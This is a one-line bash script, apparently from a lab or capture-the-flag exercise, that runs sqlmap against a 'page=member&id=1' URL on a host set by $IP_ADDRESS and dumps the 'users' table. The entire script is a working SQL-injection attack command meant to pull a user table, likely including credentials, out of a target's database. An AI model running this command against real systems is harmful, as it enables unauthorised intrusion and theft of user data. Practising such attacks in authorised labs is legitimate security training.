#!/bin/bash

sqlmap -u "http://$IP_ADDRESS/index.php?page=member&id=1&Submit=Submit#" --dump -T users